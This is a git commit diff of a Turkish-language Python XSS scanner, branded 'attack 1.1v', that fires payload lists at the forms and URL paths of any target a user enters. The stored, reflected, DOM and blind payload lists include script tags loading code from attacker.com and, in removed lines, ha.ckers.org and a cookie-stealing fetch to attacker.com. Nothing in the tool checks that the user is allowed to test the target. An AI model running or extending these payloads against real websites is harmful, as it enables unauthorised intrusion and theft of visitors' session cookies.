3de7cb298be03a2e6c10e29c21a5b04a50a52eaa
enesxsec <120325383+ghost0x02@users.noreply.github.com>
2024-12-14 02:05:27 +0300

    Update xss.py

--- xss.py
+++ xss.py
@@ -2,24 +2,34 @@ import os
 import time
 import requests
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 from colorama import Fore
 
+def clear_console():
+    os.system("clear" if os.name == "posix" else "cls")
+
 def xss_scan(url):
-    os.system("clear")
+    clear_console()
     print(Fore.RED + """
- ██╗  ██╗███████╗███████╗
- ╚██╗██╔╝██╔════╝██╔════╝
-  ╚███╔╝ ███████╗███████╗
-  ██╔██╗ ╚════██║╚════██║ attack 1.0v
- ██╔╝ ██╗███████║███████║
- ╚═╝  ╚═╝╚══════╝╚══════╝
+ █████ █████  █████   █████
+░░███ ░░███  ███░░   ███░░
+ ░░░█████░  ░░█████ ░░█████
+  ███░░░███  ░░░░███ ░░░░██  attack 1.1v
+ █████ █████ ██████  ██████
+░░░░░ ░░░░░ ░░░░░░  ░░░░░░
+
+producer  〔coded by enesxsec〕
+instagram 〔xsecit〕
+github    〔https://github.com/ghost0x02〕
+
 """)
+
     try:
         response = requests.get(url)
         if response.status_code == 200:
             print(Fore.YELLOW + f"{url} adresi başarıyla tarandı!")
-            print(Fore.RED + "")
-            time.sleep(4)
+            print(Fore.GREEN + "")
+            time.sleep(2)
             soup = BeautifulSoup(response.content, 'html.parser')
             forms = soup.find_all('form')
 
@@ -29,6 +39,8 @@ def xss_scan(url):
                 reflected_xss_test(form, url)
                 dom_based_xss_test(form, url)
                 blind_xss_test(form, url)
+
+            generic_xss_test(url)
 
         else:
             print(f"URL'ye bağlanırken bir hata oluştu. Durum kodu: {response.status_code}")
@@ -40,16 +52,6 @@ def stored_xss_test(soup, url):
     stored_xss_payloads = [
         '<script>alert("Stored XSS Attack")</script>',
         '<img src="x" onerror="alert(\'Stored XSS Attack\')" />',
-        '<svg onload="alert(\'Stored XSS Attack\')"></svg>',
-        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
-        '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
-        '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
-        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
-        '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
-        '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
-        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
-        '<IMG SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmci>',
-        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
     ]
 
     for payload in stored_xss_payloads:
@@ -60,12 +62,6 @@ def reflected_xss_test(form, url):
     reflected_xss_payloads = [
         '<script>alert("Reflected XSS Attack")</script>',
         '<img src="x" onerror="alert(\'Reflected XSS Attack\')" />',
-        '<svg onload="alert(\'Reflected XSS Attack\')"></svg>',
-        '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<A HREF="http://66.102.7.147/">XSS</A>',
-        '<input/onmouseover="javaSCRIPT:confirm(1)">',
-        '<sVg><scRipt %00>alert(1) {Opera}',
-        '<img/src=%00 onerror=this.onerror=confirm(1)>',
     ]
 
     for payload in reflected_xss_payloads:
@@ -83,7 +79,6 @@ def dom_based_xss_test(form, url):
     dom_based_xss_payloads = [
         '<script>document.write("DOM-based XSS Attack")</script>',
         '<img src="x" onerror="alert(\'DOM-based XSS Attack\')" />',
-        '<svg onload="alert(\'DOM-based XSS Attack\')"></svg>'
     ]
 
     for payload in dom_based_xss_payloads:
@@ -101,7 +96,6 @@ def blind_xss_test(form, url):
     blind_xss_payloads = [
         '<img src="x" onerror="alert(\'Blind XSS Attack\')" />',
         '<script src="https://attacker.com/malicious.js"></script>',
-        '<svg><script>fetch("https://attacker.com/steal-cookies")</script></svg>'
     ]
 
     for payload in blind_xss_payloads:
@@ -115,6 +109,27 @@ def blind_xss_test(form, url):
             except requests.exceptions.RequestException as e:
                 print(f"Post isteği sırasında hata oluştu: {e}")
 
+def generic_xss_test(url):
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert('XSS')>",
+    ]
+
+    for payload in xss_payloads:
+        test_url = urljoin(url, payload)
+        try:
+            response = requests.get(test_url)
+            if payload in response.text:
+                print(f"Generic XSS zafiyeti bulundu: {test_url} - Payload: {payload}")
+            else:
+                print(f"Zafiyet bulunamadı: {test_url} - Payload: {payload}")
+        except requests.exceptions.RequestException as e:
+            print(f"GET isteği sırasında hata oluştu: {e}")
+
 if __name__ == "__main__":
+    os.system("clear")
+    print(Fore.MAGENTA + "")
+    os.system("figlet xss")
     target_url = input("Hedef URL'yi girin: ")
     xss_scan(target_url)
